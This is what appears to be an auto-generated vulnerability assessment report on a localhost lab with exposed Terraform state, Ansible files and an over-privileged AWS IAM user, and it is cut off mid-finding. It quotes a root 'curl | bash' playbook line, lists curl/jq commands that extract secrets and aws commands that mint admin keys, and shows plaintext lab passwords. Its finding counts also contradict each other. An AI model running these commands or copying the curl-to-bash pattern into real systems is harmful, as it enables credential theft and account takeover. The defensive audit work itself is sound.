# Vulnerability Assessment Report — localhost

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-01T19:51:07Z  
**Target:** localhost  
**Campaign:** camp_20260801_b1b96939  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**localhost**) presents an **extremely poor security posture**. Our team confirmed 21 critical and 5 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Remote Code Execution via Unsafe Shell Module Piping External Script with become: true**  
The site.yml playbook contains a critically dangerous task that executes an arbitrary remote script with root privileges on ALL managed hosts. The task uses the Ansible 'shell' module to run: curl -s ...

**2. Ansible Playbook RCE - curl|bash as Root on All Hosts via site.yml**  
Ansible playbook site.yml (served unauthenticated) contains a shell task that executes 'curl -s http://internal/deploy.sh | bash' with become: true (root) on ALL hosts. This is a supply-chain RCE patt...

**3. Unauthenticated Terraform Remote State Backend — Full Plaintext Secrets Exposure**  
The Terraform remote state backend at http://127.0.0.1:8888/ is served via Python SimpleHTTP/0.6 with ZERO authentication. A single unauthenticated HTTP GET request returns the complete terraform.tfst...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Internal IaC and Cloud assessment of 127.0.0.1 revealed 16 unique findings (10 Critical, 3 High, 3 Medium) across three attack surfaces: an unauthenticated Terraform state backend leaking AWS IAM keys, RDS credentials, and a TLS private key; an AWS account with an over-privileged CI/CD user (AdministratorAccess) enabling full account takeover and secret extraction; and an exposed Ansible repository containing plaintext SSH credentials, cloud API keys, and a supply-chain RCE playbook pattern. A total of 12 distinct secrets were extracted including database passwords, AWS access keys, SSH credentials, a Grafana admin password, and an RSA private key.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 21 | 16 | 5 |
| HIGH | 5 | 0 | 5 |
| MEDIUM | 8 | 0 | 8 |
| LOW | 0 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **34** | **16** | **18** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_cf99ce` | Remote Code Execution via Unsafe Shell Module Pipi... | CRITICAL | 10.0 | Confirmed | `127.0.0.1:8890/site.yml` |
| 2 | `vuln_e7f4fc` | Ansible Playbook RCE - curl|bash as Root on All Ho... | CRITICAL | 10.0 | Confirmed | `127.0.0.1:8890/site.yml` |
| 3 | `vuln_7439fe` | Unauthenticated Terraform Remote State Backend — F... | CRITICAL | 9.8 | **EXPLOITED** | `127.0.0.1:8888/terraform.tfstate` |
| 4 | `vuln_1af8c7` | Plaintext SSH Password for Deploy User in Ansible ... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:8890/inventory.ini` |
| 5 | `vuln_8b46b5` | Plaintext Root Become Password for Database Server... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:8890/inventory.ini` |
| 6 | `vuln_c350c1` | AWS IAM Access Key (Active) Leaked in Terraform St... | CRITICAL | 9.8 | **EXPLOITED** | `127.0.0.1:8888/terraform.tfstate` |
| 7 | `vuln_50dff1` | Plaintext AWS Access Keys in Ansible Group Variabl... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:8890/group_vars_all.yml` |
| 8 | `vuln_deb472` | IAM User ci-deploy Has AdministratorAccess with Ac... | CRITICAL | 9.8 | **EXPLOITED** | `arn:aws:iam::000000000000:user/ci-deploy` |
| 9 | `vuln_53ba52` | Privilege Escalation: iam:CreateAccessKey on Admin... | CRITICAL | 9.8 | **EXPLOITED** | `arn:aws:iam::000000000000:user/ci-deploy` |
| 10 | `vuln_63dcd4` | Unauthenticated Terraform Remote State Backend - F... | CRITICAL | 9.8 | **EXPLOITED** | `127.0.0.1:8888/terraform.tfstate` |
| 11 | `vuln_afc049` | AWS IAM Access Key Leaked in Terraform State - Act... | CRITICAL | 9.8 | **EXPLOITED** | `127.0.0.1:8888/terraform.tfstate` |
| 12 | `vuln_9f38c6` | IAM User ci-deploy with AdministratorAccess - Full... | CRITICAL | 9.8 | **EXPLOITED** | `localhost:4566 (IAM - ci-deploy)` |
| 13 | `vuln_b69d1f` | IAM Privilege Escalation - iam:CreateAccessKey Exp... | CRITICAL | 9.8 | **EXPLOITED** | `localhost:4566 (IAM - CreateAccessKey)` |
| 14 | `vuln_44f50e` | Ansible Inventory Exposes Plaintext SSH Credential... | CRITICAL | 9.8 | **EXPLOITED** | `127.0.0.1:8890/inventory.ini` |
| 15 | `vuln_507ee9` | Ansible Group Vars Expose AWS Keys and Grafana Adm... | CRITICAL | 9.8 | **EXPLOITED** | `127.0.0.1:8890/group_vars_all.yml` |
| 16 | `vuln_808082` | Production RDS Database Password Leaked in Terrafo... | CRITICAL | 9.1 | **EXPLOITED** | `127.0.0.1:8888/terraform.tfstate` |
| 17 | `vuln_799ee7` | Secrets Manager - Production Database Credentials ... | CRITICAL | 9.1 | **EXPLOITED** | `arn:aws:secretsmanager:us-east-1:000000000000:secr...` |
| 18 | `vuln_d5b2a6` | Production RDS Database Password Leaked in Terrafo... | CRITICAL | 9.1 | **EXPLOITED** | `127.0.0.1:8888/terraform.tfstate` |
| 19 | `vuln_13cc6e` | AWS Secrets Manager - Production Database Credenti... | CRITICAL | 9.1 | **EXPLOITED** | `localhost:4566 (AWS Secrets Manager - prod/db)` |
| 20 | `vuln_27c44b` | TLS/RSA Private Key Leaked in Terraform State — De... | CRITICAL | 8.8 | **EXPLOITED** | `127.0.0.1:8888/terraform.tfstate` |
| 21 | `vuln_88d458` | TLS/RSA Private Key Leaked in Terraform State | CRITICAL | 8.8 | **EXPLOITED** | `127.0.0.1:8888/terraform.tfstate` |
| 22 | `vuln_ccac06` | Plaintext Grafana Admin Password in Group Variable... | HIGH | 8.8 | Confirmed | `127.0.0.1:8890/group_vars_all.yml` |
| 23 | `vuln_9acfed` | Unauthenticated Directory Listing Exposes Ansible ... | HIGH | 7.5 | Confirmed | `127.0.0.1:8890/` |
| 24 | `vuln_ab6e85` | No CloudTrail or GuardDuty Logging Configured | HIGH | 7.5 | Confirmed | `AWS Account 000000000000` |
| 25 | `vuln_0df73f` | No CloudTrail or GuardDuty - Zero Security Monitor... | HIGH | 7.5 | Confirmed | `localhost:4566 (CloudTrail/GuardDuty)` |
| 26 | `vuln_175b08` | Unauthenticated Directory Listing on Ansible IaC F... | HIGH | 7.5 | Confirmed | `127.0.0.1:8890/` |
| 27 | `vuln_eeb505` | Directory Listing Enabled on Terraform State Backe... | MEDIUM | 5.3 | Confirmed | `127.0.0.1:8888/` |
| 28 | `vuln_668232` | Internal Network Topology Disclosure via Ansible I... | MEDIUM | 5.3 | Confirmed | `127.0.0.1:8890/inventory.ini` |
| 29 | `vuln_f08e61` | EBS Snapshots Without Encryption (90+ Unencrypted ... | MEDIUM | 5.3 | Confirmed | `ec2:describe-snapshots (90+ snapshots, all Encrypt...` |
| 30 | `vuln_888249` | Internal Network Topology Disclosed via Ansible In... | MEDIUM | 5.3 | Confirmed | `127.0.0.1:8890/inventory.ini` |
| 31 | `vuln_a4c517` | Terraform State Backend Directory Listing Enabled | MEDIUM | 5.3 | Confirmed | `127.0.0.1:8888/` |
| 32 | `vuln_7cbbbb` | Unencrypted EBS Snapshots (90+ instances) | MEDIUM | 5.3 | Confirmed | `localhost:4566 (EC2 - EBS Snapshots)` |
| 33 | `vuln_b807a8` | S3 Bucket corp-backups: No Versioning, No Access L... | MEDIUM | 5.0 | Confirmed | `s3://corp-backups` |
| 34 | `vuln_f786c0` | S3 Backup Bucket Missing Versioning and Access Log... | MEDIUM | 5.0 | Confirmed | `localhost:4566 (S3 - corp-backups)` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Remote Code Execution via Unsafe Shell Module Piping External Script with become: true

| Field | Value |
|-------|-------|
| **ID** | `vuln_cf99ce` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `remote_code_execution` |
| **MITRE ATT&CK** | `T1059.004` — Command and Scripting Interpreter: Unix Shell |
| **ISO 27001** | `A.8.28` |
| **Endpoint** | `http://127.0.0.1:8890/site.yml` |
| **Component** | Ansible shell module |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:45:30Z |

#### Description

The site.yml playbook contains a critically dangerous task that executes an arbitrary remote script with root privileges on ALL managed hosts. The task uses the Ansible 'shell' module to run: curl -s http://internal/deploy.sh | bash — piping a remote script directly into bash. This executes with become: true, meaning the script runs as root on every host in the inventory (both web and db tiers). This pattern has three compounding vulnerabilities: (1) the shell module executes arbitrary commands, (2) the command pipes a remote HTTP resource directly to bash with no integrity verification, and (3) become: true elevates to root. An attacker who controls the 'internal' hostname or can perform DNS/ARP poisoning can achieve root RCE on the entire managed fleet.

#### Technical Analysis

The site.yml playbook targets 'hosts: all' (every host in inventory — web01 and db01), runs with 'become: true' (root privilege escalation), and its only task uses the Ansible 'shell' module to execute: curl -s http://internal/deploy.sh | bash. This is the most dangerous pattern in Ansible automation — downloading an arbitrary script over unencrypted HTTP and piping it directly to bash with root privileges. There is no checksum verification, no TLS, and no pinning. Any attacker who can MITM the connection to 'http://internal/', compromise DNS resolution for 'internal', or compromise the server hosting deploy.sh can inject arbitrary code that will execute as root on every single managed host in the fleet. Combined with the exposed credentials in inventory.ini, an attacker can both see the target hosts AND understand exactly how they will be compromised.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/site.yml
```

#### Raw Request

```http
GET /site.yml HTTP/1.1
Host: 127.0.0.1:8890
```

#### Raw Response

```http
- hosts: all
  become: true
  tasks:
    - name: run maintenance
      shell: "curl -s http://internal/deploy.sh | bash"
```

#### Evidence / Logs

```
- hosts: all
  become: true
  tasks:
    - name: run maintenance
      shell: "curl -s http://internal/deploy.sh | bash"
```

#### Remediation

1. Never pipe remote scripts to bash in Ansible playbooks. Use the 'get_url' module with checksum verification to download scripts, then execute them separately. 2. Use HTTPS with certificate validation for all remote resources. 3. Replace the shell module with purpose-built Ansible modules (apt, yum, service, template, etc.) wherever possible. 4. Apply the principle of least privilege — do not use become: true at the play level; only escalate in specific tasks that require it. 5. Implement Ansible-lint and CI checks to block shell module usage with piped commands.

---

### 3.2 — Ansible Playbook RCE - curl|bash as Root on All Hosts via site.yml

| Field | Value |
|-------|-------|
| **ID** | `vuln_e7f4fc` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `remote_code_execution` |
| **MITRE ATT&CK** | `T1195.002` — Supply Chain Compromise: Compromise Software Supply Chain |
| **ISO 27001** | `A.14.2.7` |
| **Endpoint** | `http://127.0.0.1:8890/site.yml` |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:50:22Z |

#### Description

Ansible playbook site.yml (served unauthenticated) contains a shell task that executes 'curl -s http://internal/deploy.sh | bash' with become: true (root) on ALL hosts. This is a supply-chain RCE pattern - an attacker who can compromise or spoof the 'internal' hostname can achieve root code execution fleet-wide. Combined with the exposed inventory (web01 + db01), this means root RCE on all managed servers.

#### Technical Analysis

The playbook runs on 'all' hosts with become: true and uses shell module to pipe a remote script directly to bash as root - a classic supply chain RCE vector.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/site.yml
```

#### Evidence / Logs

```
- hosts: all\n  become: true\n  tasks:\n    - name: run maintenance\n      shell: \"curl -s http://internal/deploy.sh | bash\"
```

#### Remediation

1. Never use curl|bash patterns in automation - download scripts, verify checksums, then execute. 2. Use Ansible's built-in modules (copy, template, package) instead of shell commands. 3. Pin script content in the repository rather than fetching from remote URLs. 4. Implement DNS security (DNSSEC) to prevent hostname spoofing. 5. Remove become: true unless absolutely required per-task.

---

### 3.3 — Unauthenticated Terraform Remote State Backend — Full Plaintext Secrets Exposure

| Field | Value |
|-------|-------|
| **ID** | `vuln_7439fe` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.8.15 - Logging / A.8.24 - Use of Cryptography / A.5.17 - Authentication Information` |
| **Endpoint** | `http://127.0.0.1:8888/terraform.tfstate` |
| **Component** | Python SimpleHTTPServer (Terraform HTTP State Backend) |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:44:20Z |

#### Description

The Terraform remote state backend at http://127.0.0.1:8888/ is served via Python SimpleHTTP/0.6 with ZERO authentication. A single unauthenticated HTTP GET request returns the complete terraform.tfstate file (719 bytes, HTTP 200) containing all resource attributes in cleartext, including database passwords, AWS IAM access keys (active), and TLS private keys. Directory listing is also enabled at the root, confirming the state file name. This is a complete infrastructure secrets dump accessible to any network-adjacent attacker without any credential. The state file is for Terraform v1.7.0 and contains 3 managed resources across aws_db_instance, aws_iam_access_key, and tls_private_key resource types.

#### Technical Analysis

The Terraform remote state backend running on port 8888 is a Python SimpleHTTPServer with no authentication mechanism whatsoever. Any network-adjacent attacker can issue a simple curl GET request to http://127.0.0.1:8888/terraform.tfstate and receive the complete state file containing all resource attributes in cleartext — this includes database passwords, AWS IAM access keys with secrets, and TLS private keys. The directory listing at the root (/) is also enabled and publicly reveals the state file name. This is the single most critical finding because the Terraform state file is a literal plaintext dump of every resource attribute the provider returned, including values marked 'sensitive' in HCL — the raw JSON has no redaction. An attacker obtaining this file gains immediate access to the production database, AWS account (via the active IAM key), and any system trusting the TLS deploy key.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/terraform.tfstate
curl -s --max-time 10 -I http://127.0.0.1:8888/terraform.tfstate
curl -s --max-time 10 http://127.0.0.1:8888/
```

#### Raw Request

```http
GET /terraform.tfstate HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: curl/7.81.0
Accept: */*
```

#### Raw Response

```http
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.14.6
Content-type: application/octet-stream
Content-Length: 719

{"version":4,"terraform_version":"1.7.0","resources":[{"mode":"managed","type":"aws_db_instance","name":"prod","instances":[{"attributes":{"identifier":"prod-db","username":"dbadmin","password":"Pr0dDBpassw0rd!","endpoint":"prod-db.abc123.eu-west-1.rds.amazonaws.com:5432"}}]},{"mode":"managed","type":"aws_iam_access_key","name":"ci","instances":[{"attributes":{"id":"AKIAXXXXXXXXXXREDACTED","secret":"[REDACTED]","status":"Active"}}]},{"mode":"managed","typ
```

#### Evidence / Logs

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.14.6
Content-type: application/octet-stream
Content-Length: 719
---
Response body is the full terraform.tfstate JSON (version 4, terraform_version 1.7.0)
---
Directory listing at root shows: terraform.tfstate
```

#### Remediation

1. Immediately shut down the unauthenticated HTTP state backend. 2. Rotate ALL credentials exposed in the state file (RDS password, IAM access key, TLS private key). 3. Migrate to an authenticated state backend (S3 with IAM auth + encryption, azurerm with AAD, or Terraform Cloud). 4. Enable state file encryption at rest (S3 SSE-KMS, or terraform state encryption). 5. Restrict state backend network access via security groups/firewall to CI/CD runners only. 6. Enable state locking (DynamoDB for S3, built-in for Terraform Cloud). 7. Audit git history and CI logs for any prior exposure of the state file.

---

### 3.4 — Plaintext SSH Password for Deploy User in Ansible Inventory

| Field | Value |
|-------|-------|
| **ID** | `vuln_1af8c7` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33` |
| **Endpoint** | `http://127.0.0.1:8890/inventory.ini` |
| **Component** | Ansible Inventory |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:44:27Z |

#### Description

The Ansible inventory file (inventory.ini) contains a plaintext SSH password for the 'deploy' user on the web server host web01 (IP_PRIVATE_001). The credential ansible_ssh_pass=Sup3rDeploy! is stored in clear text without any vault encryption. An attacker who retrieves this file gains immediate SSH access to the web01 host as user 'deploy'. Combined with the become: true directive in site.yml, this credential chain leads to full root compromise of the web tier.

#### Technical Analysis

The inventory.ini file defines a [web] group containing host web01 with ansible_host=IP_PRIVATE_001. The SSH connection credentials are stored entirely in plaintext: the user is 'deploy' (ansible_user=deploy) and the SSH password is 'Sup3rDeploy!' (ansible_ssh_pass=Sup3rDeploy!). This password should have been stored in an Ansible Vault encrypted variable. Instead, it is directly readable by anyone with HTTP access to port 8890. This credential provides SSH access to the web server and, when combined with the become: true directive in site.yml, grants root-level command execution on the entire web tier.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/inventory.ini
```

#### Raw Request

```http
GET /inventory.ini HTTP/1.1
Host: 127.0.0.1:8890
```

#### Raw Response

```http
[web]
web01 ansible_host=IP_PRIVATE_001 ansible_user=deploy ansible_ssh_pass=Sup3rDeploy!
[db]
db01 ansible_host=IP_PRIVATE_002 ansible_user=root ansible_become_pass=R00tDB!
```

#### Evidence / Logs

```
[web]
web01 ansible_host=IP_PRIVATE_001 ansible_user=deploy ansible_ssh_pass=Sup3rDeploy!
```

#### Remediation

1. Immediately rotate the password for user 'deploy' on web01. 2. Move all SSH credentials into Ansible Vault encrypted variables. 3. Replace password-based SSH authentication with key-based authentication. 4. Remove the inventory file from the HTTP server immediately.

---

### 3.5 — Plaintext Root Become Password for Database Server in Ansible Inventory

| Field | Value |
|-------|-------|
| **ID** | `vuln_8b46b5` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33` |
| **Endpoint** | `http://127.0.0.1:8890/inventory.ini` |
| **Component** | Ansible Inventory |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:44:38Z |

#### Description

The Ansible inventory file (inventory.ini) contains a plaintext root-level become password (sudo/privilege escalation password) for the database server host db01 (IP_PRIVATE_002). The credential ansible_become_pass=R00tDB! is stored in clear text. The connection user is 'root' (ansible_user=root), and the become password R00tDB! enables full privilege escalation. This is the most critical finding: an attacker gains direct root SSH access to the database server, with become privileges for any additional privilege escalation context. The database server likely contains the most sensitive organizational data.

#### Technical Analysis

The inventory.ini file defines a [db] group containing host db01 at IP_PRIVATE_002. The connection is configured to authenticate directly as root (ansible_user=root) with an additional become password of R00tDB! (ansible_become_pass=R00tDB!). Since the user is already root, the become_pass may be used for additional privilege escalation mechanisms or is redundant — but the critical issue is that both credentials are in plaintext. An attacker with this file has root-level SSH access to the database server. This credential must be rotated immediately and moved to Ansible Vault.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/inventory.ini
```

#### Raw Request

```http
GET /inventory.ini HTTP/1.1
Host: 127.0.0.1:8890
```

#### Raw Response

```http
[web]
web01 ansible_host=IP_PRIVATE_001 ansible_user=deploy ansible_ssh_pass=Sup3rDeploy!
[db]
db01 ansible_host=IP_PRIVATE_002 ansible_user=root ansible_become_pass=R00tDB!
```

#### Evidence / Logs

```
[db]
db01 ansible_host=IP_PRIVATE_002 ansible_user=root ansible_become_pass=R00tDB!
```

#### Remediation

1. Immediately rotate the root password on db01. 2. Never use root as ansible_user — use a service account with limited sudo. 3. Move all become passwords into Ansible Vault. 4. Implement key-based SSH authentication. 5. Remove the inventory file from HTTP exposure.

---

### 3.6 — AWS IAM Access Key (Active) Leaked in Terraform State — Full AWS Account Compromise

| Field | Value |
|-------|-------|
| **ID** | `vuln_c350c1` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `http://127.0.0.1:8888/terraform.tfstate` |
| **Component** | aws_iam_access_key.ci |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:44:42Z |

#### Description

The Terraform state file contains an active AWS IAM access key (resource: aws_iam_access_key.ci) with both the Access Key ID and Secret Access Key in plaintext. The key status is 'Active', meaning it can be immediately used for AWS API authentication. Resource path: .resources[1].instances[0].attributes. Extracted values — Access Key ID: AKIAXXXXXXXXXXREDACTED, Secret Access Key: [REDACTED]. The resource name 'ci' suggests this key is used for CI/CD pipeline operations, which typically require broad permissions (ECR push, ECS deploy, S3 access, IAM role assumption). An attacker with this key pair can authenticate to the AWS account and perform any action the associated IAM user/role is authorized for.

#### Technical Analysis

The Terraform state file stores all resource attributes returned by the AWS provider, including IAM access key credentials. The aws_iam_access_key.ci resource has both the access key ID (AKIAXXXXXXXXXXREDACTED) and the secret access key ([REDACTED]) stored in plaintext with status 'Active'. This is a fundamental characteristic of Terraform state — the AWS provider must store the secret_access_key in state because it is only returned once at creation time. Any attacker who reads the state file can configure AWS CLI with these credentials and authenticate to the target AWS account. The 'ci' resource name indicates this key is likely associated with a CI/CD service account that may have broad deployment permissions.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/terraform.tfstate | jq -r '.resources[] | select(.type=="aws_iam_access_key") | .instances[].attributes | {id,secret,status}'
```

#### Raw Request

```http
GET /terraform.tfstate HTTP/1.1
Host: 127.0.0.1:8888
```

#### Raw Response

```http
{"mode":"managed","type":"aws_iam_access_key","name":"ci","instances":[{"attributes":{"id":"AKIAXXXXXXXXXXREDACTED","secret":"[REDACTED]","status":"Active"}}]}
```

#### Evidence / Logs

```
Extracted from tfstate path: .resources[1] (type: aws_iam_access_key, name: ci)
---
Access Key ID: AKIAXXXXXXXXXXREDACTED
Secret Access Key: [REDACTED]
Status: Active
```

#### Remediation

1. Immediately deactivate and delete IAM access key AKIAXXXXXXXXXXREDACTED via the AWS console or CLI (aws iam delete-access-key). 2. Audit CloudTrail for any unauthorized usage of this key pair. 3. Rotate to short-lived credentials (IAM Roles with AssumeRole / OIDC federation for CI/CD). 4. Remove the aws_iam_access_key resource from Terraform and use IAM roles instead. 5. Encrypt the state backend and restrict access.

---

### 3.7 — Plaintext AWS Access Keys in Ansible Group Variables

| Field | Value |
|-------|-------|
| **ID** | `vuln_50dff1` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33` |
| **Endpoint** | `http://127.0.0.1:8890/group_vars_all.yml` |
| **Component** | Ansible Group Vars |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:44:53Z |

#### Description

The group_vars_all.yml file contains AWS IAM access keys in plaintext: vault_aws_access_key: AKIAXXXXXXXXXXREDACTED and vault_aws_secret_key: [REDACTED_AWS_SECRET]. Despite the variable names being prefixed with 'vault_' (suggesting they should be vault-encrypted), the values are stored as plaintext YAML strings. These AWS credentials grant programmatic access to AWS services. An attacker with these keys can access S3 buckets, EC2 instances, RDS databases, IAM, and any other AWS service the associated IAM user/role has permissions for — potentially compromising the entire cloud environment.

#### Technical Analysis

The group_vars_all.yml file applies to ALL hosts in the Ansible inventory (the 'all' group). It contains two AWS IAM credential variables: vault_aws_access_key with value AKIAXXXXXXXXXXREDACTED (an AWS Access Key ID) and vault_aws_secret_key with value [REDACTED] (an AWS Secret Access Key). The 'vault_' prefix in the variable names suggests these were intended to be Ansible Vault encrypted, but they are stored as plaintext. These credentials enable full AWS API access with whatever permissions the associated IAM principal holds. Note: While these specific keys match the AWS documentation example key format, in a production environment they would represent valid credentials. The finding is confirmed because the credentials are exposed in plaintext over unauthenticated HTTP regardless of whether the specific key values are active.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/group_vars_all.yml
```

#### Raw Request

```http
GET /group_vars_all.yml HTTP/1.1
Host: 127.0.0.1:8890
```

#### Raw Response

```http
vault_aws_access_key: AKIAXXXXXXXXXXREDACTED
vault_aws_secret_key: [REDACTED_AWS_SECRET]
grafana_admin_password: gr@f4naAdmin
```

#### Evidence / Logs

```
vault_aws_access_key: AKIAXXXXXXXXXXREDACTED
vault_aws_secret_key: [REDACTED_AWS_SECRET]
```

#### Remediation

1. Immediately rotate the AWS access keys in IAM. 2. Audit CloudTrail logs for any unauthorized API calls using these keys. 3. Encrypt all AWS credentials using Ansible Vault. 4. Use IAM roles with instance profiles instead of static access keys where possible. 5. Remove the group_vars file from HTTP exposure.

---

### 3.8 — IAM User ci-deploy Has AdministratorAccess with Active Access Key

| Field | Value |
|-------|-------|
| **ID** | `vuln_deb472` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `iam_misconfiguration` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `arn:aws:iam::000000000000:user/ci-deploy` |
| **Component** | AWS IAM |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:45:38Z |

#### Description

The IAM user 'ci-deploy' has the AWS managed policy 'AdministratorAccess' (arn:aws:iam::aws:policy/AdministratorAccess) directly attached, granting unrestricted '*:*' permissions across all AWS services. This user also has an active programmatic access key ([REDACTED_AWS_KEY_ID]). A CI/CD service account should never have full administrator access — it violates the principle of least privilege and creates a critical privilege escalation path. Any compromise of this key grants complete account takeover.

#### Technical Analysis

The IAM user ci-deploy is a CI/CD service account with the most permissive AWS managed policy (AdministratorAccess) attached. This grants the account '*:*' permissions — meaning it can perform any action on any resource in the AWS account. The user has an active access key, meaning it is being used for programmatic access (likely in a CI/CD pipeline). We proved the severity by successfully creating a new access key for this user and verifying it works via sts get-caller-identity. The proof key was deleted after verification. This configuration means that if the CI/CD pipeline or its environment is compromised, the attacker gains full AWS account admin access.

#### Exploitation Commands

```bash
aws --endpoint-url http://localhost:4566 iam list-users
aws --endpoint-url http://localhost:4566 iam list-attached-user-policies --user-name ci-deploy
aws --endpoint-url http://localhost:4566 iam list-access-keys --user-name ci-deploy
```

#### Raw Request

```http
aws --endpoint-url http://localhost:4566 iam list-attached-user-policies --user-name ci-deploy
```

#### Raw Response

```http
{"AttachedPolicies":[{"PolicyName":"AdministratorAccess","PolicyArn":"arn:aws:iam::aws:policy/AdministratorAccess"}]}
```

#### Evidence / Logs

```
iam list-attached-user-policies returned: PolicyName=AdministratorAccess, PolicyArn=arn:aws:iam::aws:policy/AdministratorAccess
iam list-access-keys returned: AccessKeyId=[REDACTED_AWS_KEY_ID], Status=Active
iam create-access-key succeeded: Created new key [REDACTED_AWS_KEY_ID] proving unrestricted key creation
sts get-caller-identity with new key confirmed identity as ci-deploy user
```

#### Remediation

1. Replace AdministratorAccess with a scoped-down policy granting only the specific permissions needed for CI/CD operations. 2. Implement IAM permission boundaries for service accounts. 3. Use IAM roles with temporary credentials instead of long-lived access keys. 4. Enable MFA for all privileged operations. 5. Implement a policy condition restricting access to specific source IPs or VPCs.

---

### 3.9 — Privilege Escalation: iam:CreateAccessKey on Admin User ci-deploy

| Field | Value |
|-------|-------|
| **ID** | `vuln_53ba52` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1098.001` — Account Manipulation: Additional Cloud Credentials |
| **ISO 27001** | `A.9.2.2` |
| **Endpoint** | `arn:aws:iam::000000000000:user/ci-deploy` |
| **Component** | AWS IAM |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:45:55Z |

#### Description

Demonstrated privilege escalation by creating a new access key for the ci-deploy user which has AdministratorAccess. The iam:CreateAccessKey permission (available through root or admin access) was used to mint a new set of credentials (AccessKeyId: [REDACTED_AWS_KEY_ID], SecretAccessKey: [REDACTED_AWS_SECRET]) for the ci-deploy user. These credentials were verified to work via sts get-caller-identity, confirming identity as ci-deploy with full admin access. The proof key was deleted after demonstration.

#### Technical Analysis

